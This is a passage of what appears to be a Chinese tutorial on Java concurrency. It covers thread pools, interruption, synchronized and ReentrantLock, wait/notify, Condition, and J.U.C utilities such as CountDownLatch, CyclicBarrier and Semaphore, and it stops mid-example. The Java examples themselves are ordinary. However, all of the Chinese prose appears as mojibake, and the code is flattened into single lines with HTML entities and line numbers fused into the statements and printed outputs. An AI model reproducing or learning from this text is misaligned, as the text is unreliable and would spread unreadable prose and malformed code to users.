éœ€ç¨‹åºå‘˜æ˜¾å¼åœ°ç®¡ç†çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸã€‚è¿™é‡Œçš„å¼‚æ­¥æ˜¯æŒ‡å¤šä¸ªä»»åŠ¡çš„æ‰§è¡Œäº’ä¸å¹²æ‰°ï¼Œä¸éœ€è¦è¿›è¡ŒåŒæ­¥æ“ä½œã€‚ ä¸»è¦æœ‰ä¸‰ç§ Executorï¼š CachedThreadPoolï¼šä¸€ä¸ªä»»åŠ¡åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼› FixedThreadPoolï¼šæ‰€æœ‰ä»»åŠ¡åªèƒ½ä½¿ç”¨å›ºå®šå¤§å°çš„çº¿ç¨‹ï¼› SingleThreadExecutorï¼šç›¸å½“äºå¤§å°ä¸º 1 çš„ FixedThreadPoolã€‚ 1234567public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 5; i++) &#123; executorService.execute(new MyRunnable()); &#125; executorService.shutdown();&#125; Daemonå®ˆæŠ¤çº¿ç¨‹æ˜¯ç¨‹åºè¿è¡Œæ—¶åœ¨åå°æä¾›æœåŠ¡çš„çº¿ç¨‹ï¼Œä¸å±äºç¨‹åºä¸­ä¸å¯æˆ–ç¼ºçš„éƒ¨åˆ†ã€‚ å½“æ‰€æœ‰éå®ˆæŠ¤çº¿ç¨‹ç»“æŸæ—¶ï¼Œç¨‹åºä¹Ÿå°±ç»ˆæ­¢ï¼ŒåŒæ—¶ä¼šæ€æ­»æ‰€æœ‰å®ˆæŠ¤çº¿ç¨‹ã€‚ main() å±äºéå®ˆæŠ¤çº¿ç¨‹ã€‚ ä½¿ç”¨ setDaemon() æ–¹æ³•å°†ä¸€ä¸ªçº¿ç¨‹è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹ã€‚ 1234public static void main(String[] args) &#123; Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true);&#125; sleep()Thread.sleep(millisec) æ–¹æ³•ä¼šä¼‘çœ å½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ï¼Œmillisec å•ä½ä¸ºæ¯«ç§’ã€‚ sleep() å¯èƒ½ä¼šæŠ›å‡º InterruptedExceptionï¼Œå› ä¸ºå¼‚å¸¸ä¸èƒ½è·¨çº¿ç¨‹ä¼ æ’­å› main() ä¸­ï¼Œå› æ­¤å¿…é¡»åœ¨æœ¬åœ°è¿›è¡Œå¤„ç†ã€‚çº¿ç¨‹ä¸­æŠ›å‡ºçš„å…¶å®ƒå¼‚å¸¸ä¹ŸåŒæ ·éœ€è¦åœ¨æœ¬åœ°è¿›è¡Œå¤„ç†ã€‚ 1234567public void run() &#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125; yield()å¯¹é™æ€æ–¹æ³• Thread.yield() çš„è°ƒç”¨å£°æ˜äº†å½“å‰çº¿ç¨‹å·²ç»å®Œæˆäº†ç”Ÿå‘½å‘¨æœŸä¸­æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå¯ä»¥åˆ‡æ¢ç»™å…¶å®ƒçº¿ç¨‹æ¥æ‰§è¡Œã€‚è¯¥æ–¹æ³•åªæ˜¯å¯¹çº¿ç¨‹è°ƒåº¦å™¨çš„ä¸€ä¸ªå»ºè®®ï¼Œè€Œä¸”ä¹Ÿåªæ˜¯å»ºè®®å…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„å…¶å®ƒçº¿ç¨‹å¯ä»¥è¿è¡Œã€‚ 123public void run() &#123; Thread.yield();&#125; å››ã€ä¸­æ–­ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå®Œæ¯•ä¹‹åä¼šè‡ªåŠ¨ç»“æŸï¼Œå¦‚æœåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸ä¹Ÿä¼šæå‰ç»“æŸã€‚ InterruptedExceptioné€šè¿‡è°ƒç”¨ä¸€ä¸ªçº¿ç¨‹çš„ interrupt() æ¥ä¸­æ–­è¯¥çº¿ç¨‹ï¼Œå¦‚æœè¯¥çº¿ç¨‹å¤„äºé˜»å¡ã€é™æœŸç­‰å¾…æˆ–è€…æ— é™æœŸç­‰å¾…çŠ¶æ€ï¼Œé‚£ä¹ˆå°±ä¼šæŠ›å‡º InterruptedExceptionï¼Œä»è€Œæå‰ç»“æŸè¯¥çº¿ç¨‹ã€‚ä½†æ˜¯ä¸èƒ½ä¸­æ–­ I/O é˜»å¡å’Œ synchronized é”é˜»å¡ã€‚ å¯¹äºä»¥ä¸‹ä»£ç ï¼Œåœ¨ main() ä¸­å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ä¹‹åå†ä¸­æ–­å®ƒï¼Œç”±äºçº¿ç¨‹ä¸­è°ƒç”¨äº† Thread.sleep() æ–¹æ³•ï¼Œå› æ­¤ä¼šæŠ›å‡ºä¸€ä¸ª InterruptedExceptionï¼Œä»è€Œæå‰ç»“æŸçº¿ç¨‹ï¼Œä¸æ‰§è¡Œä¹‹åçš„è¯­å¥ã€‚ 1234567891011121314public class InterruptExample &#123; private static class MyThread1 extends Thread &#123; @Override public void run() &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) throws InterruptedException &#123; Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println("Main run");&#125; 123456Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) interrupted()å¦‚æœä¸€ä¸ªçº¿ç¨‹çš„ run() æ–¹æ³•æ‰§è¡Œä¸€ä¸ªæ— é™å¾ªç¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ‰§è¡Œ sleep() ç­‰ä¼šæŠ›å‡º InterruptedException çš„æ“ä½œï¼Œé‚£ä¹ˆè°ƒç”¨çº¿ç¨‹çš„ interrupt() æ–¹æ³•å°±æ— æ³•ä½¿çº¿ç¨‹æå‰ç»“æŸã€‚ ä½†æ˜¯è°ƒç”¨ interrupt() æ–¹æ³•ä¼šè®¾ç½®çº¿ç¨‹çš„ä¸­æ–­æ ‡è®°ï¼Œæ­¤æ—¶è°ƒç”¨ interrupted() æ–¹æ³•ä¼šè¿”å› trueã€‚å› æ­¤å¯ä»¥åœ¨å¾ªç¯ä½“ä¸­ä½¿ç”¨ interrupted() æ–¹æ³•æ¥åˆ¤æ–­çº¿ç¨‹æ˜¯å¦å¤„äºä¸­æ–­çŠ¶æ€ï¼Œä»è€Œæå‰ç»“æŸçº¿ç¨‹ã€‚ 123456789101112public class InterruptExample &#123; private static class MyThread2 extends Thread &#123; @Override public void run() &#123; while (!interrupted()) &#123; // .. &#125; System.out.println("Thread end"); &#125; &#125;&#125; 12345public static void main(String[] args) throws InterruptedException &#123; Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt();&#125; 1Thread end Executor çš„ä¸­æ–­æ“ä½œè°ƒç”¨ Executor çš„ shutdown() æ–¹æ³•ä¼šç­‰å¾…çº¿ç¨‹éƒ½æ‰§è¡Œå®Œæ¯•ä¹‹åå†å…³é—­ï¼Œä½†æ˜¯å¦‚æœè°ƒç”¨çš„æ˜¯ shutdownNow() æ–¹æ³•ï¼Œåˆ™ç›¸å½“äºè°ƒç”¨æ¯ä¸ªçº¿ç¨‹çš„ interrupt() æ–¹æ³•ã€‚ ä»¥ä¸‹ä½¿ç”¨ Lambda åˆ›å»ºçº¿ç¨‹ï¼Œç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå†…éƒ¨çº¿ç¨‹ã€‚ 12345678910111213public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); executorService.shutdownNow(); System.out.println("Main run");&#125; 12345678Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) å¦‚æœåªæƒ³ä¸­æ–­ Executor ä¸­çš„ä¸€ä¸ªçº¿ç¨‹ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ submit() æ–¹æ³•æ¥æäº¤ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ª Future&lt;?&gt; å¯¹è±¡ï¼Œé€šè¿‡è°ƒç”¨è¯¥å¯¹è±¡çš„ cancel(true) æ–¹æ³•å°±å¯ä»¥ä¸­æ–­çº¿ç¨‹ã€‚ 1234Future&lt;?&gt; future = executorService.submit(() -&gt; &#123; // ..&#125;);future.cancel(true); äº”ã€äº’æ–¥åŒæ­¥Java æä¾›äº†ä¸¤ç§é”æœºåˆ¶æ¥æ§åˆ¶å¤šä¸ªçº¿ç¨‹å¯¹å…±äº«èµ„æºçš„äº’æ–¥è®¿é—®ï¼Œç¬¬ä¸€ä¸ªæ˜¯ JVM å®ç°çš„ synchronizedï¼Œè€Œå¦ä¸€ä¸ªæ˜¯ JDK å®ç°çš„ ReentrantLockã€‚ synchronized1. åŒæ­¥ä¸€ä¸ªä»£ç å— 12345public void func() &#123; synchronized (this) &#123; // ... &#125;&#125; å®ƒåªä½œç”¨äºåŒä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨ä¸¤ä¸ªå¯¹è±¡ä¸Šçš„åŒæ­¥ä»£ç å—ï¼Œå°±ä¸ä¼šè¿›è¡ŒåŒæ­¥ã€‚ å¯¹äºä»¥ä¸‹ä»£ç ï¼Œä½¿ç”¨ ExecutorService æ‰§è¡Œäº†ä¸¤ä¸ªçº¿ç¨‹ï¼Œç”±äºè°ƒç”¨çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡çš„åŒæ­¥ä»£ç å—ï¼Œå› æ­¤è¿™ä¸¤ä¸ªçº¿ç¨‹ä¼šè¿›è¡ŒåŒæ­¥ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è¿›å…¥åŒæ­¥è¯­å¥å—æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å°±å¿…é¡»ç­‰å¾…ã€‚ 12345678910public class SynchronizedExample &#123; public void func1() &#123; synchronized (this) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e1.func1());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 å¯¹äºä»¥ä¸‹ä»£ç ï¼Œä¸¤ä¸ªçº¿ç¨‹è°ƒç”¨äº†ä¸åŒå¯¹è±¡çš„åŒæ­¥ä»£ç å—ï¼Œå› æ­¤è¿™ä¸¤ä¸ªçº¿ç¨‹å°±ä¸éœ€è¦åŒæ­¥ã€‚ä»è¾“å‡ºç»“æœå¯ä»¥çœ‹å‡ºï¼Œä¸¤ä¸ªçº¿ç¨‹äº¤å‰æ‰§è¡Œã€‚ 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e2.func1());&#125; 10 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 2. åŒæ­¥ä¸€ä¸ªæ–¹æ³• 123public synchronized void func () &#123; // ...&#125; å®ƒå’ŒåŒæ­¥ä»£ç å—ä¸€æ ·ï¼Œä½œç”¨äºåŒä¸€ä¸ªå¯¹è±¡ã€‚ 3. åŒæ­¥ä¸€ä¸ªç±» 12345public void func() &#123; synchronized (SynchronizedExample.class) &#123; // ... &#125;&#125; ä½œç”¨äºæ•´ä¸ªç±»ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªçº¿ç¨‹è°ƒç”¨åŒä¸€ä¸ªç±»çš„ä¸åŒå¯¹è±¡ä¸Šçš„è¿™ç§åŒæ­¥è¯­å¥ï¼Œä¹Ÿä¼šè¿›è¡ŒåŒæ­¥ã€‚ 12345678910public class SynchronizedExample &#123; public void func2() &#123; synchronized (SynchronizedExample.class) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func2()); executorService.execute(() -&gt; e2.func2());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 4. åŒæ­¥ä¸€ä¸ªé™æ€æ–¹æ³• 123public synchronized static void fun() &#123; // ...&#125; ä½œç”¨äºæ•´ä¸ªç±»ã€‚ ReentrantLock123456789101112131415public class LockExample &#123; private Lock lock = new ReentrantLock(); public void func() &#123; lock.lock(); try &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; finally &#123; lock.unlock(); // ç¡®ä¿é‡Šæ”¾é”ï¼Œä»è€Œé¿å…å‘ç”Ÿæ­»é”ã€‚ &#125; &#125;&#125; 123456public static void main(String[] args) &#123; LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; lockExample.func()); executorService.execute(() -&gt; lockExample.func());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 ReentrantLock æ˜¯ java.util.concurrentï¼ˆJ.U.Cï¼‰åŒ…ä¸­çš„é”ï¼Œç›¸æ¯”äº synchronizedï¼Œå®ƒå¤šäº†ä»¥ä¸‹é«˜çº§åŠŸèƒ½ï¼š 1. ç­‰å¾…å¯ä¸­æ–­ å½“æŒæœ‰é”çš„çº¿ç¨‹é•¿æœŸä¸é‡Šæ”¾é”çš„æ—¶å€™ï¼Œæ­£åœ¨ç­‰å¾…çš„çº¿ç¨‹å¯ä»¥é€‰æ‹©æ”¾å¼ƒç­‰å¾…ï¼Œæ”¹ä¸ºå¤„ç†å…¶ä»–äº‹æƒ…ã€‚ 2. å¯å®ç°å…¬å¹³é” å…¬å¹³é”æ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹åœ¨ç­‰å¾…åŒä¸€ä¸ªé”æ—¶ï¼Œå¿…é¡»æŒ‰ç…§ç”³è¯·é”çš„æ—¶é—´é¡ºåºæ¥ä¾æ¬¡è·å¾—é”ã€‚ synchronized ä¸­çš„é”æ˜¯éå…¬å¹³çš„ï¼ŒReentrantLock é»˜è®¤æƒ…å†µä¸‹ä¹Ÿæ˜¯éå…¬å¹³çš„ï¼Œä½†å¯ä»¥é€šè¿‡å¸¦å¸ƒå°”å€¼çš„æ„é€ å‡½æ•°è¦æ±‚ä½¿ç”¨å…¬å¹³é”ã€‚ 3. é”ç»‘å®šå¤šä¸ªæ¡ä»¶ ä¸€ä¸ª ReentrantLock å¯¹è±¡å¯ä»¥åŒæ—¶ç»‘å®šå¤šä¸ª Condition å¯¹è±¡ã€‚ synchronized å’Œ ReentrantLock æ¯”è¾ƒ1. é”çš„å®ç° synchronized æ˜¯ JVM å®ç°çš„ï¼Œè€Œ ReentrantLock æ˜¯ JDK å®ç°çš„ã€‚ 2. æ€§èƒ½ æ–°ç‰ˆæœ¬ Java å¯¹ synchronized è¿›è¡Œäº†å¾ˆå¤šä¼˜åŒ–ï¼Œä¾‹å¦‚è‡ªæ—‹é”ç­‰ã€‚ç›®å‰æ¥çœ‹å®ƒå’Œ ReentrantLock çš„æ€§èƒ½åŸºæœ¬æŒå¹³äº†ï¼Œå› æ­¤æ€§èƒ½å› ç´ ä¸å†æ˜¯é€‰æ‹© ReentrantLock çš„ç†ç”±ã€‚synchronized æœ‰æ›´å¤§çš„æ€§èƒ½ä¼˜åŒ–ç©ºé—´ï¼Œåº”è¯¥ä¼˜å…ˆè€ƒè™‘ synchronizedã€‚ 3. åŠŸèƒ½ ReentrantLock å¤šäº†ä¸€äº›é«˜çº§åŠŸèƒ½ã€‚ 4. ä½¿ç”¨é€‰æ‹© é™¤ééœ€è¦ä½¿ç”¨ ReentrantLock çš„é«˜çº§åŠŸèƒ½ï¼Œå¦åˆ™ä¼˜å…ˆä½¿ç”¨ synchronizedã€‚è¿™æ˜¯å› ä¸º synchronized æ˜¯ JVM å®ç°çš„ä¸€ç§é”æœºåˆ¶ï¼ŒJVM åŸç”Ÿåœ°æ”¯æŒå®ƒï¼Œè€Œ ReentrantLock ä¸æ˜¯æ‰€æœ‰çš„ JDK ç‰ˆæœ¬éƒ½æ”¯æŒã€‚å¹¶ä¸”ä½¿ç”¨ synchronized ä¸ç”¨æ‹…å¿ƒæ²¡æœ‰é‡Šæ”¾é”è€Œå¯¼è‡´æ­»é”é—®é¢˜ï¼Œå› ä¸º JVM ä¼šç¡®ä¿é”çš„é‡Šæ”¾ã€‚ å…­ã€çº¿ç¨‹ä¹‹é—´çš„åä½œå½“å¤šä¸ªçº¿ç¨‹å¯ä»¥ä¸€èµ·å·¥ä½œå»è§£å†³æŸä¸ªé—®é¢˜æ—¶ï¼Œå¦‚æœæŸäº›éƒ¨åˆ†å¿…é¡»åœ¨å…¶å®ƒéƒ¨åˆ†ä¹‹å‰å®Œæˆï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹çº¿ç¨‹è¿›è¡Œåè°ƒã€‚ join()åœ¨çº¿ç¨‹ä¸­è°ƒç”¨å¦ä¸€ä¸ªçº¿ç¨‹çš„ join() æ–¹æ³•ï¼Œä¼šå°†å½“å‰çº¿ç¨‹æŒ‚èµ·ï¼Œè€Œä¸æ˜¯å¿™ç­‰å¾…ï¼Œç›´åˆ°ç›®æ ‡çº¿ç¨‹ç»“æŸã€‚ å¯¹äºä»¥ä¸‹ä»£ç ï¼Œè™½ç„¶ b çº¿ç¨‹å…ˆå¯åŠ¨ï¼Œä½†æ˜¯å› ä¸ºåœ¨ b çº¿ç¨‹ä¸­è°ƒç”¨äº† a çº¿ç¨‹çš„ join() æ–¹æ³•ï¼Œb çº¿ç¨‹ä¼šç­‰å¾… a çº¿ç¨‹ç»“æŸæ‰ç»§ç»­æ‰§è¡Œï¼Œå› æ­¤æœ€åèƒ½å¤Ÿä¿è¯ a çº¿ç¨‹çš„è¾“å‡ºå…ˆäº b çº¿ç¨‹çš„è¾“å‡ºã€‚ 1234567891011121314151617181920212223242526272829303132333435public class JoinExample &#123; private class A extends Thread &#123; @Override public void run() &#123; System.out.println("A"); &#125; &#125; private class B extends Thread &#123; private A a; B(A a) &#123; this.a = a; &#125; @Override public void run() &#123; try &#123; a.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("B"); &#125; &#125; public void test() &#123; A a = new A(); B b = new B(a); b.start(); a.start(); &#125;&#125; 1234public static void main(String[] args) &#123; JoinExample example = new JoinExample(); example.test();&#125; 12AB wait() notify() notifyAll()è°ƒç”¨ wait() ä½¿å¾—çº¿ç¨‹ç­‰å¾…æŸä¸ªæ¡ä»¶æ»¡è¶³ï¼Œçº¿ç¨‹åœ¨ç­‰å¾…æ—¶ä¼šè¢«æŒ‚èµ·ï¼Œå½“å…¶ä»–çº¿ç¨‹çš„è¿è¡Œä½¿å¾—è¿™ä¸ªæ¡ä»¶æ»¡è¶³æ—¶ï¼Œå…¶å®ƒçº¿ç¨‹ä¼šè°ƒç”¨ notify() æˆ–è€… notifyAll() æ¥å”¤é†’æŒ‚èµ·çš„çº¿ç¨‹ã€‚ å®ƒä»¬éƒ½å±äº Object çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸å±äº Threadã€‚ åªèƒ½ç”¨åœ¨åŒæ­¥æ–¹æ³•æˆ–è€…åŒæ­¥æ§åˆ¶å—ä¸­ä½¿ç”¨ï¼Œå¦åˆ™ä¼šåœ¨è¿è¡Œæ—¶æŠ›å‡º IllegalMonitorStateExeceptionã€‚ ä½¿ç”¨ wait() æŒ‚èµ·æœŸé—´ï¼Œçº¿ç¨‹ä¼šé‡Šæ”¾é”ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœæ²¡æœ‰é‡Šæ”¾é”ï¼Œé‚£ä¹ˆå…¶å®ƒçº¿ç¨‹å°±æ— æ³•è¿›å…¥å¯¹è±¡çš„åŒæ­¥æ–¹æ³•æˆ–è€…åŒæ­¥æ§åˆ¶å—ä¸­ï¼Œé‚£ä¹ˆå°±æ— æ³•æ‰§è¡Œ notify() æˆ–è€… notifyAll() æ¥å”¤é†’æŒ‚èµ·çš„çº¿ç¨‹ï¼Œé€ æˆæ­»é”ã€‚ 123456789101112131415public class WaitNotifyExample &#123; public synchronized void before() &#123; System.out.println("before"); notifyAll(); &#125; public synchronized void after() &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("after"); &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter wait() å’Œ sleep() çš„åŒºåˆ« wait() æ˜¯ Object çš„æ–¹æ³•ï¼Œè€Œ sleep() æ˜¯ Thread çš„é™æ€æ–¹æ³•ï¼› wait() ä¼šé‡Šæ”¾é”ï¼Œsleep() ä¸ä¼šã€‚ await() signal() signalAll()java.util.concurrent ç±»åº“ä¸­æä¾›äº† Condition ç±»æ¥å®ç°çº¿ç¨‹ä¹‹é—´çš„åè°ƒï¼Œå¯ä»¥åœ¨ Condition ä¸Šè°ƒç”¨ await() æ–¹æ³•ä½¿çº¿ç¨‹ç­‰å¾…ï¼Œå…¶å®ƒçº¿ç¨‹è°ƒç”¨ signal() æˆ– signalAll() æ–¹æ³•å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ã€‚ç›¸æ¯”äº wait() è¿™ç§ç­‰å¾…æ–¹å¼ï¼Œawait() å¯ä»¥æŒ‡å®šç­‰å¾…çš„æ¡ä»¶ï¼Œå› æ­¤æ›´åŠ çµæ´»ã€‚ ä½¿ç”¨ Lock æ¥è·å–ä¸€ä¸ª Condition å¯¹è±¡ã€‚ 1234567891011121314151617181920212223242526public class AwaitSignalExample &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() &#123; lock.lock(); try &#123; System.out.println("before"); condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void after() &#123; lock.lock(); try &#123; condition.await(); System.out.println("after"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter ä¸ƒã€J.U.C - AQSjava.util.concurrentï¼ˆJ.U.Cï¼‰å¤§å¤§æé«˜äº†å¹¶å‘æ€§èƒ½ï¼ŒAQS è¢«è®¤ä¸ºæ˜¯ J.U.C çš„æ ¸å¿ƒã€‚ CountdownLatchç”¨æ¥æ§åˆ¶ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¤šä¸ªçº¿ç¨‹ã€‚ ç»´æŠ¤äº†ä¸€ä¸ªè®¡æ•°å™¨ cntï¼Œæ¯æ¬¡è°ƒç”¨ countDown() æ–¹æ³•ä¼šè®©è®¡æ•°å™¨çš„å€¼å‡ 1ï¼Œå‡åˆ° 0 çš„æ—¶å€™ï¼Œé‚£äº›å› ä¸ºè°ƒç”¨ await() æ–¹æ³•è€Œåœ¨ç­‰å¾…çš„çº¿ç¨‹å°±ä¼šè¢«å”¤é†’ã€‚ 1234567891011121314151617public class CountdownLatchExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CountDownLatch countDownLatch = new CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("run.."); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); System.out.println("end"); executorService.shutdown(); &#125;&#125; 1run..run..run..run..run..run..run..run..run..run..end CyclicBarrierç”¨æ¥æ§åˆ¶å¤šä¸ªçº¿ç¨‹äº’ç›¸ç­‰å¾…ï¼Œåªæœ‰å½“å¤šä¸ªçº¿ç¨‹éƒ½åˆ°è¾¾æ—¶ï¼Œè¿™äº›çº¿ç¨‹æ‰ä¼šç»§ç»­æ‰§è¡Œã€‚ å’Œ CountdownLatch ç›¸ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ç»´æŠ¤è®¡æ•°å™¨æ¥å®ç°çš„ã€‚ä½†æ˜¯å®ƒçš„è®¡æ•°å™¨æ˜¯é€’å¢çš„ï¼Œæ¯æ¬¡æ‰§è¡Œ await() æ–¹æ³•ä¹‹åï¼Œè®¡æ•°å™¨ä¼šåŠ  1ï¼Œç›´åˆ°è®¡æ•°å™¨çš„å€¼å’Œè®¾ç½®çš„å€¼ç›¸ç­‰ï¼Œç­‰å¾…çš„æ‰€æœ‰çº¿ç¨‹æ‰ä¼šç»§ç»­æ‰§è¡Œã€‚å’Œ CountdownLatch çš„å¦ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼ŒCyclicBarrier çš„è®¡æ•°å™¨å¯ä»¥å¾ªç¯ä½¿ç”¨ï¼Œæ‰€ä»¥å®ƒæ‰å«åšå¾ªç¯å±éšœã€‚ ä¸‹å›¾åº”è¯¥ä»ä¸‹å¾€ä¸Šçœ‹æ‰æ­£ç¡®ã€‚ 123456789101112131415161718192021public class CyclicBarrierExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("before.."); try &#123; cyclicBarrier.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (BrokenBarrierException e) &#123; e.printStackTrace(); &#125; System.out.print("after.."); &#125;); &#125; executorService.shutdown(); &#125;&#125; 1before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after.. SemaphoreSemaphore å°±æ˜¯æ“ä½œç³»ç»Ÿä¸­çš„ä¿¡å·é‡ï¼Œå¯ä»¥æ§åˆ¶å¯¹äº’æ–¥èµ„æºçš„è®¿é—®çº¿ç¨‹æ•°ã€‚ ä»¥ä¸‹ä»£ç æ¨¡æ‹Ÿäº†å¯¹æŸä¸ªæœåŠ¡çš„å¹¶å‘è¯·æ±‚ï¼Œæ¯æ¬¡åªèƒ½æœ‰ 3 ä¸ªå®¢æˆ·ç«¯åŒæ—¶è®¿é—®ï¼Œè¯·æ±‚æ€»æ•°ä¸º 10ã€‚ 123456789101112131415161718192021public class SemaphoreExample &#123; public static void main(String[] args) &#123; final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalRequestCount; i++) &#123; executorService.execute(()-&gt;&#123; try &#123; semaphore.acquire(); System.out.print(semaphore.availablePermits() + " "); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; semaphore.release(); &#125; &#125;); &#125; executorService.shutdown(); &#125;&#125; 12 1 2 2 2 2 2 1 2 2 å…«ã€J.U.C - å…¶å®ƒç»„ä»¶FutureTaskåœ¨ä»‹ç» Callable æ—¶æˆ‘ä»¬çŸ¥é“å®ƒå¯ä»¥æœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼é€šè¿‡ Future è¿›è¡Œå°è£…ã€‚FutureTask å®ç°äº† RunnableFuture æ¥å£ï¼Œè¯¥æ¥å£ç»§æ‰¿è‡ª Runnable å’Œ Future æ¥å£ï¼Œè¿™ä½¿å¾— FutureTask æ—¢å¯ä»¥å½“åšä¸€ä¸ªä»»åŠ¡æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æœ‰è¿”å›å€¼ã€‚ 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; 1public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; FutureTask å¯ç”¨äºå¼‚æ­¥è·å–æ‰§è¡Œç»“æœæˆ–å–æ¶ˆæ‰§è¡Œä»»åŠ¡çš„åœºæ™¯ã€‚å½“ä¸€ä¸ªè®¡ç®—ä»»åŠ¡éœ€è¦æ‰§è¡Œå¾ˆé•¿æ—¶é—´ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨ FutureTask æ¥å°è£…è¿™ä¸ªä»»åŠ¡ï¼Œä¸»çº¿ç¨‹åœ¨å®Œæˆè‡ªå·±çš„ä»»åŠ¡ä¹‹åå†å»è·å–ç»“æœã€‚ 1234567891011121314151617181920212223242526272829public class FutureTaskExample &#123; public static void main(String[] args) throws 